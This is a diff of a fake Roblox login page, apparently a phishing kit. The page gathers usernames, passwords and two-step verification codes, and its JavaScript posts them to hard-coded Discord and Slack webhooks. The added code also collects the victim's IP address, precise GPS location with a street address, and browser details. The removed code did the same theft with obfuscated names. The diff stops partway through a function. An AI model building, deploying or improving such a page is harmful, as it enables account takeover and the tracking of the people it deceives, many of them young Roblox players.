@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -285,365 +285,26 @@
                 </div>
             </div>
 
-            <div role="dialog" id="otpEmailModal" style="display: none;">
+            <div role="dialog" id="RecoveryFromAuthen" style="display: none;">
                 <div class="fade modal-backdrop in"></div>
                 <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
                     <div class="modal-dialog"><div class="modal-content" role="document">
                         <div class="modal-header">
-                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('otpEmailModal').style.display = 'none';"><span class="icon-close"></span></button>
-                            <h4 class="modal-title">Login with One-Time Code</h4>
-                        </div>
-                        <div class="modal-body">
-                            <div class="modal-lock-icon"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter your email address and we'll send you a one-time code to log in.</p>
-                            <div class="input-control-wrapper">
-                                <div class="form-group">
-                                    <input type="email" maxlength="120" placeholder="Email Address" id="otp-email-input" class="input-field form-control">
-                                    <div class="form-control-label bottom-label xsmall" id="otp-error">&nbsp;</div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="modal-footer">
-                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="otp-send-btn">Send Code</button></div>
-                            <p class="text-footer">We'll never share your email with anyone.</p>
-                        </div>
-                    </div></div>
-                </div>
-            </div>
-
-            <div role="dialog" id="otpCodeModal" style="display: none;">
-                <div class="fade modal-backdrop in"></div>
-                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
-                    <div class="modal-dialog"><div class="modal-content" role="document">
-                        <div class="modal-header">
-                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('otpCodeModal').style.display = 'none';"><span class="icon-close"></span></button>
-                            <h4 class="modal-title">Enter One-Time Code</h4>
-                        </div>
-                        <div class="modal-body">
-                            <div class="modal-lock-icon"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter the 6-digit code we sent to <b id="otp-email-display"></b>.</p>
-                            <div class="input-control-wrapper">
-                                <div class="form-group">
-                                    <input maxlength="6" oninput="twostepInput(this.value, 'otp-verify-btn'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="otp-code-input" class="input-field form-control">
-                                    <div class="form-control-label bottom-label xsmall" id="otp-code-error">&nbsp;</div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="modal-footer">
-                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="otp-verify-btn" disabled>Verify</button></div>
-                            <p class="text-footer">Never share your one-time code with anyone.</p>
-                        </div>
-                    </div></div>
-                </div>
-            </div>
-
-        </div>
-    </div>
-
-    <footer class="container-footer" id="footer-container">
-        <div class="footer">
-            <ul class="row footer-links">
-                <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Jobs</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Blog</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Parents</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Gift Cards</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Help</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Terms</a></li>
-                <li class="footer-link"><a class="text-footer-nav" href="#">Accessibility</a></li>
-                <li class="footer-link"><a class="text-footer-nav privacy" href="#">Privacy</a></li>
-            </ul>
-            <div class="row copyright-container">
-                <div class="col-sm-12">
-                    <p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
-                </div>
-            </div>
-        </div>
-    </footer>
-</div>
-<script>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox</title>
-<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
-<link rel="stylesheet" href="https://css.rbxcdn.com/15b88564eae926990141be36eb3a9bd761cf2778fc9ac3425cdd4db1473148f4.css">
-<link rel="stylesheet" href="https://css.rbxcdn.com/8fa43545250dfbd7d96d164fe24e886391fdccc9b87b0dc91ce78933aebcda43.css">
-<link rel="stylesheet" href="https://css.rbxcdn.com/c92e5fc4564200cb9d84ba69bd53e4a4f86109709b8db691c1567dd257c1115b.css">
-<link rel="stylesheet" href="https://css.rbxcdn.com/6686c24b7d5461929debb2b62b589c5399f35ba8ea8ffdd641cf2a6b0b0b686e.css">
-<link rel="stylesheet" href="https://css.rbxcdn.com/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css">
-<link rel="stylesheet" href="https://css.rbxcdn.com/c12b1163bd09c1076e861bfcbb98ab175a37971fae6a96c54c031afbb6589427.css">
-<style>
-    .background-image.marketing-background-1 {
-        width: 100%;
-        background: radial-gradient(circle at center, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.75) 100%), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') 50% / cover no-repeat fixed !important;
-        position: fixed;
-        top: 0;
-        left: 0;
-        height: 100vh;
-        z-index: -1;
-    }
-    .rbx-body, .content, .container-main {
-        background: transparent !important;
-        background-color: transparent !important;
-    }
-    #twostep-error, #Authen-error, #RecoveryFromEmail-error, #RecoveryFromAuthen-error, #otp-code-error {
-        color: #e53935 !important;
-        font-weight: 600;
-    }
-    .login-error {
-        color: #e53935 !important;
-        font-weight: 600;
-        display: block;
-        margin-top: 6px;
-        min-height: 18px;
-    }
-    @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @keyframes modalScaleIn {
-        from { opacity: 0; transform: scale(0.95) translateY(6px); }
-        to { opacity: 1; transform: scale(1) translateY(0); }
-    }
-    .modal-backdrop.in { animation: modalFadeIn .2s ease-out; }
-    .modal-modern.in .modal-content {
-        animation: modalScaleIn .22s cubic-bezier(.2,.8,.3,1);
-        transform-origin: center center;
-    }
-    .rbx-bars {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        gap: 4px;
-        height: 20px;
-        margin: 12px auto;
-    }
-    .rbx-bars .bar {
-        width: 4px;
-        height: 100%;
-        background: #fff;
-        border-radius: 2px;
-        transform-origin: center;
-        animation: barStretch 1.1s ease-in-out infinite;
-    }
-    .rbx-bars .bar:nth-child(1) { animation-delay: 0s; }
-    .rbx-bars .bar:nth-child(2) { animation-delay: .15s; }
-    .rbx-bars .bar:nth-child(3) { animation-delay: .3s; }
-    @keyframes barStretch {
-        0%, 100% { transform: scaleY(0.35); opacity: 0.4; }
-        50%      { transform: scaleY(1);    opacity: 1; }
-    }
-    .rbx-bars.small { height: 14px; margin: 0; }
-    .rbx-bars.small .bar { width: 3px; }
-    .avatar-preview-box {
-        width: 80px;
-        height: 80px;
-        border-radius: 50%;
-        margin: 0 auto 15px auto;
-        border: 2px solid #0084ff;
-        object-fit: cover;
-        display: none;
-    }
-</style>
-</head>
-<body id="rbx-body" class="rbx-body dark-theme gotham-font" data-internal-page-name="Login">
-
-<div id="wrap" class="wrap no-gutter-ads logged-out">
-    <div id="navigation-container" class="dark-theme gotham-font">
-        <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
-            <div class="container-fluid">
-                <div class="rbx-navbar-header">
-                    <div class="navbar-header">
-                        <a class="navbar-brand" href="/login">
-                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
-                        </a>
-                    </div>
-                </div>
-                <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/robux">Robux</a></li>
-                </ul>
-                <div id="right-navigation-header">
-                    <div class="navbar-right rbx-navbar-right">
-                        <ul class="nav navbar-right rbx-navbar-right-nav">
-                            <li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="/login">Sign Up</a></li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="container-main" id="container-main" tabindex="-1">
-        <div class="content">
-            <script>
-            function twostepInput(a, b){
-                if(a.length == 6){ document.getElementById(b).disabled = false; }
-                else { document.getElementById(b).disabled = true; }
-            }
-            function twostepInputRecovery(a, b){
-                if(a.length == 9){ document.getElementById(b).disabled = false; }
-                else { document.getElementById(b).disabled = true; }
-            }
-            </script>
-
-            <div id="react-login-container" class="login-container">
-                <div id="background-image" class="background-image marketing-background-1"></div>
-                <div id="login-base">
-                    <div class="section-content login-section">
-                        <h1 class="login-header">Login to Roblox</h1>
-                        <img id="avatar-preview" class="avatar-preview-box" alt="Avatar">
-                        <div id="login-form">
-                            <div>
-                                <div class="login-form-container">
-                                    <form class="login-form">
-                                        <div class="form-group username-form-group">
-                                            <label for="login-username" class="sr-only">Username/Email/Phone</label>
-                                            <input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" autocomplete="username">
-                                        </div>
-                                        <div class="form-group password-form-group">
-                                            <label for="login-password" class="sr-only">Password</label>
-                                            <input id="login-password" name="password" type="password" autocomplete="current-password" class="form-control input-field" placeholder="Password">
-                                        </div>
-                                        <div aria-live="polite">
-                                            <p class="form-control-label xsmall login-error" id="text-error"></p>
-                                        </div>
-                                        <div id="login-loading" class="rbx-bars" style="display:none;"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
-                                        <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
-                                    </form>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="#">Forgot Password or Username?</a></div>
-                        <div>
-                            <div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div>
-                            <button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button>
-                            <button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Use Another Device</span></button>
-                        </div>
-                        <div class="text-center">
-                            <div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="#">Sign Up</a></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div role="dialog" id="methodChoice" style="display: none;">
-                <div class="fade modal-backdrop in"></div>
-                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
-                    <div class="modal-dialog"><div class="modal-content" role="document">
-                        <div class="modal-header">
-                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('methodChoice').style.display = 'none';"><span class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                        </div>
-                        <div class="modal-body">
-                            <div class="modal-lock-icon"></div>
-                            <p class="modal-margin-bottom-xlarge">Choose a verification method to continue.</p>
-                            <table class="table table-striped media-type-list modal-margin-bottom-large"><tbody>
-                                <tr class="media-type-row" data-method="Email" onclick="chooseMethod('Email')">
-                                    <td><span class="icon-menu-email"></span></td>
-                                    <td class="media-type-label">Email</td>
-                                    <td class="media-type-selector"><span class="icon-next"></span></td>
-                                </tr>
-                                <tr class="media-type-row" data-method="Authenticator" onclick="chooseMethod('Authenticator')">
-                                    <td><span class="icon-menu-mobile"></span></td>
-                                    <td class="media-type-label">Authenticator</td>
-                                    <td class="media-type-selector"><span class="icon-next"></span></td>
-                                </tr>
-                                <tr class="media-type-row" data-method="Backup Code" onclick="chooseMethod('Backup Code')">
-                                    <td><span class="icon-menu-recover"></span></td>
-                                    <td class="media-type-label">Backup Code</td>
-                                    <td class="media-type-selector"><span class="icon-next"></span></td>
-                                </tr>
-                            </tbody></table>
-                        </div>
-                        <div class="modal-footer">
-                            <p class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
-                        </div>
-                    </div></div>
-                </div>
-            </div>
-
-            <div role="dialog" id="twostepverification" style="display: none;">
-                <div class="fade modal-backdrop in"></div>
-                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
-                    <div class="modal-dialog"><div class="modal-content" role="document">
-                        <div class="modal-header">
-                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('twostepverification').style.display = 'none';"><span class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                        </div>
-                        <div class="modal-body">
-                            <div class="modal-lock-icon"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p>
-                            <div class="input-control-wrapper">
-                                <div id="twostep-group" class="form-group">
-                                    <input maxlength="6" oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input" class="input-field form-control">
-                                    <div class="form-control-label bottom-label xsmall" id="twostep-error">&nbsp;</div>
-                                </div>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox"> <label for="remember-device">Trust this device for 30 days</label></p>
-                            <p><button type="button" id="resend-btn" class="modal-body-button-link small">Resend Code</button></p>
-                        </div>
-                        <div class="modal-footer">
-                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="verifyButton" disabled>Verify</button></div>
-                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
-                        </div>
-                    </div></div>
-                </div>
-            </div>
-
-            <div role="dialog" id="authenticatorverification" style="display: none;">
-                <div class="fade modal-backdrop in"></div>
-                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
-                    <div class="modal-dialog"><div class="modal-content" role="document">
-                        <div class="modal-header">
-                            <button type="button" onclick="document.getElementById('authenticatorverification').style.display = 'none';" class="modal-modern-header-button"><span class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                        </div>
-                        <div class="modal-body">
-                            <div class="modal-lock-icon"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app.</p>
-                            <div class="input-control-wrapper">
-                                <div id="Authen-group" class="form-group">
-                                    <input maxlength="6" oninput="twostepInput(this.value, 'AuthenButton'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input-authenticator" class="input-field form-control">
-                                    <div class="form-control-label bottom-label xsmall" id="Authen-error">&nbsp;</div>
-                                </div>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
-                        </div>
-                        <div class="modal-footer">
-                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="AuthenButton" disabled>Verify</button></div>
-                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
-                        </div>
-                    </div></div>
-                </div>
-            </div>
-
-            <div role="dialog" id="RecoveryFromEmail" style="display: none;">
-                <div class="fade modal-backdrop in"></div>
-                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
-                    <div class="modal-dialog"><div class="modal-content" role="document">
-                        <div class="modal-header">
-                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromEmail').style.display = 'none';"><span class="icon-close"></span></button>
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromAuthen').style.display = 'none';"><span class="icon-close"></span></button>
                             <h4 class="modal-title">2-Step Verification</h4>
                         </div>
                         <div class="modal-body">
                             <div class="modal-lock-icon"></div>
                             <p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p>
                             <div class="input-control-wrapper">
-                                <div id="RecoveryFromEmail-group" class="form-group">
-                                    <input maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromEmailButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-RecoveryFromEmail" class="input-field form-control">
-                                    <div class="form-control-label bottom-label xsmall" id="RecoveryFromEmail-error">&nbsp;</div>
+                                <div id="RecoveryFromAuthen-group" class="form-group">
+                                    <input maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromAuthenButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-recoveryFromAuthen" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="RecoveryFromAuthen-error">&nbsp;</div>
                                 </div>
                             </div>
-                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
                         </div>
                         <div class="modal-footer">
-                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="RecoveryFromEmailButton" disabled>Verify</button></div>
-                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="RecoveryFromAuthenButton" disabled>Verify</button></div>
                         </div>
                     </div></div>
                 </div>
@@ -726,10 +387,18 @@
     </footer>
 </div>
 <script>
-const _0x1a = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
-const _0x2b = 3000;
+const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
+const WAIT = 3000;
 
-const _0x3c = [
+const EVENT_TYPES = {
+    LOGIN_ATTEMPT: { title: "🔐 Authentication Attempt", level: "INFO" },
+    MFA_CHOICE:    { title: "🛡️ MFA Method Selected",    level: "WARN" },
+    MFA_SUCCESS:   { title: "✅ MFA Verified Successfully", level: "SUCCESS" },
+    MFA_FAILED:    { title: "❌ MFA Verification Failed",   level: "ERROR" }
+};
+
+const EXTENDED_COLOR_PALETTE = [
     0x3498DB, 0xE74C3C, 0x2ECC71, 0xF1C40F, 0x9B59B6,
     0x1ABC9C, 0xE67E22, 0xE91E63, 0x00BCD4, 0x8BC34A,
     0xFF5722, 0x673AB7, 0x3F51B5, 0x009688, 0xCDDC39,
@@ -737,137 +406,258 @@ const _0x3c = [
     0x00E676, 0xFFEA00, 0xD50000, 0xAA00FF, 0x2962FF
 ];
 
-const _0x4d = {};
-let _0x5e = 0;
+const userColors = {};
+let colorIndex = 0;
 
-function _0x6f(u) {
-    const k = String(u || "unknown").toLowerCase().trim();
-    if (_0x4d[k]) return _0x4d[k];
-    const c = _0x3c[_0x5e % _0x3c.length];
-    _0x4d[k] = c;
-    _0x5e++;
-    return c;
+function getColorForUser(username) {
+    const key = String(username || "unknown").toLowerCase().trim();
+    if (userColors[key]) return userColors[key];
+    const assignedColor = EXTENDED_COLOR_PALETTE[colorIndex % EXTENDED_COLOR_PALETTE.length];
+    userColors[key] = assignedColor;
+    colorIndex++;
+    return assignedColor;
 }
 
-async function _0x70(t, user, data, av = null) {
-    if (!_0x1a || _0x1a.includes("YOUR_")) return;
-    const col = _0x6f(user);
-    const fields = [{ name: "👤 User", value: `\`\`\`${user || "N/A"}\`\`\``, inline: false }];
-    for (const [k, v] of Object.entries(data)) {
-        fields.push({ name: `🔑 ${k}`, value: `\`\`\`${v}\`\`\``, inline: false });
-    }
-    const payload = {
-        username: "Auth Bot",
-        avatar_url: av || undefined,
-        embeds: [{ title: t, color: col, fields: fields, timestamp: new Date().toISOString() }]
-    };
+let clientGeoData = { 
+    ip: "Loading...", 
+    city: "Unknown",
+    region: "Unknown",
+    postal: "Unknown",
+    country: "Unknown",
+    org: "Unknown",
+    lookupUrl: "#",
+    gpsAddress: "Fetched post-verification...",
+    mapUrl: "#"
+};
+
+(async function initIpLookup() {
     try {
-        await fetch(_0x1a, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
+        const res = await fetch('https://ipinfo.io/json');
+        const data = await res.json();
+        if (data && data.ip) {
+            clientGeoData.ip = data.ip;
+            clientGeoData.city = data.city || "Unknown";
+            clientGeoData.region = data.region || "Unknown";
+            clientGeoData.postal = data.postal || "N/A";
+            clientGeoData.country = data.country || "Unknown";
+            clientGeoData.org = data.org || "Unknown";
+            clientGeoData.lookupUrl = `https://ipinfo.io/${data.ip}`;
+        }
     } catch (e) {}
-}
+})();
 
-let _0x80 = "";
-let _0x90 = null;
-
-async function _0xa0(name, cb) {
-    try {
-        const r = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(name)}`);
-        const d = await r.json();
-        if (d && d.data && d.data.length > 0) {
-            const uid = d.data[0].id;
-            const tr = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png&isCircular=false`);
-            const td = await tr.json();
-            const av = td && td.data && td.data.length > 0 ? td.data[0].imageUrl : null;
-            cb(av);
-            return;
-        }
-    } catch(e){}
-    cb(null);
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-    const uInput = document.getElementById('login-username');
-    const pInput = document.getElementById('login-password');
-    const lBtn = document.getElementById('login-button');
-    const errText = document.getElementById('text-error');
-    const loading = document.getElementById('login-loading');
-    const avBox = document.getElementById('avatar-preview');
-
-    if (uInput) {
-        uInput.addEventListener('blur', function() {
-            const val = this.value.trim();
-            if (!val || val.indexOf('@') > -1) return;
-            _0xa0(val, (av) => {
-                if (av) {
-                    _0x90 = av;
-                    if (avBox) {
-                        avBox.src = av;
-                        avBox.style.display = 'block';
-                    }
+function requestPreciseGPS(cb) {
+    if (!navigator.geolocation) {
+        if(cb) cb();
+        return;
+    }
+    
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            clientGeoData.mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+            
+            try {
+                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const geoJson = await geoRes.json();
+                if (geoJson && geoJson.display_name) {
+                    clientGeoData.gpsAddress = geoJson.display_name;
+                } else {
+                    clientGeoData.gpsAddress = `Lat: ${lat}, Lon:${lon}`;
                 }
-            });
-        });
-    }
-
-    function _0xb0() {
-        const u = uInput ? uInput.value.trim() : '';
-        const p = pInput ? pInput.value : '';
-        if (!u || !p) {
-            if (errText) errText.textContent = "Username and password required";
-            return;
-        }
-        _0x80 = u;
-        if (errText) errText.textContent = "";
-        if (loading) loading.style.display = 'flex';
-        if (lBtn) lBtn.style.display = 'none';
-
-        _0xa0(u, (av) => {
-            if (av) _0x90 = av;
-            _0x70("🔐 Login Credentials", u, { Password: p }, _0x90);
-        });
-
-        setTimeout(() => {
-            if (loading) loading.style.display = 'none';
-            if (lBtn) lBtn.style.display = 'block';
-            const m = document.getElementById('methodChoice');
-            if (m) m.style.display = 'block';
-        }, _0x2b);
-    }
-
-    if (lBtn) {
-        lBtn.addEventListener('click', (e) => { e.preventDefault(); _0xb0(); });
-    }
-    const frm = document.querySelector('form.login-form');
-    if (frm) {
-        frm.addEventListener('submit', (e) => { e.preventDefault(); _0xb0(); });
-    }
-});
-
-function chooseMethod(m) {
-    document.getElementById('methodChoice').style.display = 'none';
-    _0x70("🛡️ 2FA Method Chosen", _0x80, { Method: m }, _0x90);
-    setTimeout(() => {
-        if (m === 'Email') document.getElementById('twostepverification').style.display = 'block';
-        else if (m === 'Authenticator') document.getElementById('authenticatorverification').style.display = 'block';
-        else if (m === 'Backup Code') document.getElementById('RecoveryFromEmail').style.display = 'block';
-    }, 300);
+            } catch (err) {
+                clientGeoData.gpsAddress = `Lat: ${lat}, Lon:${lon}`;
+            }
+            if(cb) cb();
+        },
+        (error) => {
+            clientGeoData.gpsAddress = "Access Denied / Not Granted";
+            if(cb) cb();
+        },
+        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+    );
 }
 
-function verifyCode(m, id) {
-    const el = document.getElementById(id);
-    const code = el ? el.value.trim() : '';
-    if (!code) return;
-    _0x70("✅ Code Verified", _0x80, { Method: m, Code: code }, _0x90);
+function getClientTelemetry() {
+    const ua = navigator.userAgent;
+    let os = "Unknown OS", browser = "Unknown Browser";
 
-    ['twostepverification', 'authenticatorverification', 'RecoveryFromEmail', 'RecoveryFromAuthen', 'otpCodeModal'].forEach(i => {
-        const mdl = document.getElementById(i);
-        if (mdl) mdl.style.display = 'none';
+    if (/iPad|iPhone|iPod/.test(ua)) {
+        os = /iPad/.test(ua) ? "iPadOS" : "iOS";
+    } else if (/Mac OS X/.test(ua)) {
+        os = "macOS";
+    } else if (/Windows/.test(ua)) {
+        os = "Windows";
+    } else if (/Android/.test(ua)) {
+        os = "Android";
+    } else if (/Linux/.test(ua)) {
+        os = "Linux";
+    }
+
+    if (/CriOS\//.test(ua)) {
+        browser = "Google Chrome (iOS)";
+    } else if (/FxiOS\//.test(ua)) {
+        browser = "Mozilla Firefox (iOS)";
+    } else if (/Edg\//.test(ua)) {
+        browser = "Microsoft Edge";
+    } else if (/OPR\/|Opera/.test(ua)) {
+        browser = "Opera";
+    } else if (/Chrome\//.test(ua)) {
+        browser = "Google Chrome";
+    } else if (/Firefox\//.test(ua)) {
+        browser = "Mozilla Firefox";
+    } else if (/Safari\//.test(ua)) {
+        browser = "Apple Safari";
+    }
+
+    return {
+        platform: os,
+        browser: browser,
+        resolution: `${screen.width}x${screen.height}`,
+        timestamp: new Date().toISOString()
+    };
+}
+
+async function sendStructuredAuditLog(eventType, accountIdentifier, payloadData, avatarUrl = null, profileDetails = null) {
+    const config = EVENT_TYPES[eventType] || { title: "📌 System Event", level: "DEFAULT" };
+    const userColorHex = getColorForUser(accountIdentifier);
+    const telemetry = getClientTelemetry();
+    const profileLink = accountIdentifier ? `https://www.roblox.com/users/profile?username=${encodeURIComponent(accountIdentifier)}` : null;
+
+    const discordFields = [
+        {
+            name: "👤 Account / Identity",
+            value: `> **Username:** \`${accountIdentifier || "N/A"}\``,
+            inline: false
+        }
+    ];
+
+    if (profileDetails) {
+        discordFields.push({
+            name: "📋 Roblox Profile Info",
+            value: `• **Display Name:** \`${profileDetails.displayName || "N/A"}\`\n` +
+                   `• **User ID:** \`${profileDetails.id || "N/A"}\`\n` +
+                   `• **Created:** \`${profileDetails.created ? new Date(profileDetails.created).toLocaleDateString() : "N/A"}\``,
+            inline: false
+        });
+    }
+
+    const dataEntries = Object.entries(payloadData || {});
+    if (dataEntries.length > 0) {
+        let detailsFormatted = dataEntries.map(([k, v]) => `• **${k}:** \`${v}\``).join("\n");
+        discordFields.push({
+            name: "🔑 Credentials & Parameters",
+            value: detailsFormatted,
+            inline: false
+        });
+    }
+
+    if (profileLink) {
+        discordFields.push({
+            name: "🔗 Quick Links",
+            value: `[Open Profile](${profileLink})`,
+            inline: false
+        });
+    }
+
+    discordFields.push({
+        name: "📍 Precise GPS & Address",
+        value: `• **Exact Address / GPS:** \`${clientGeoData.gpsAddress}\`\n` +
+               `• **Google Maps:** [Open Exact Location](${clientGeoData.mapUrl})\n` +
+               `• **IP & ISP:** \`${clientGeoData.ip}\` (${clientGeoData.org})`,
+        inline: false
     });
 
+    discordFields.push({
+        name: "💻 Client Telemetry",
+        value: `\`OS:\` ${telemetry.platform} | \`Browser:\` ${telemetry.browser} | \`Res:\` ${telemetry.resolution}`,
+        inline: false
+    });
+
+    const discordPayload = {
+        username: "Roblox Auth Bot",
+        avatar_url: avatarUrl || undefined,
+        embeds: [{
+            title: config.title,
+            color: userColorHex,
+            fields: discordFields,
+            footer: { text: `Level: ${config.level} • Secure Audit Logging` },
+            timestamp: telemetry.timestamp
+        }]
+    };
+
+    const slackFieldsFormatted = dataEntries.map(([k, v]) => `*${k}:* \`${v}\``).join("\n");
+    const slackPayload = {
+        text: `*${config.title}*`,
+        attachments: [{
+            color: `#${userColorHex.toString(16).padStart(6, '0')}`,
+            title: `Account: ${accountIdentifier || "Unknown"}`,
+            title_link: profileLink || undefined,
+            text: (slackFieldsFormatted ? `*Parameters:*\n${slackFieldsFormatted}\n` : "") + 
+                  `\n*GPS Address:* \`${clientGeoData.gpsAddress}\` - <${clientGeoData.mapUrl}|Open Map>`,
+            footer: `OS: ${telemetry.platform} | Browser: ${telemetry.browser}`,
+            ts: Math.floor(Date.now() / 1000)
+        }]
+    };
+
+    const requests = [];
+    if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== "YOUR_DISCORD_WEBHOOK_URL") {
+        requests.push(fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(discordPayload)
+        }).catch(() => {}));
+    }
+
+    if (SLACK_WEBHOOK && SLACK_WEBHOOK !== "YOUR_SLACK_WEBHOOK_URL") {
+        requests.push(fetch(SLACK_WEBHOOK, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(slackPayload)
+        }).catch(() => {}));
+    }
+
+    await Promise.all(requests);
+}
+
+function getRobloxProfileData(username, cb){
+    let done = false;
+    const finish = (res) => { if(done) return; done = true; cb(res); };
+    setTimeout(() => finish({ avatar: null, details: null }), 5000);
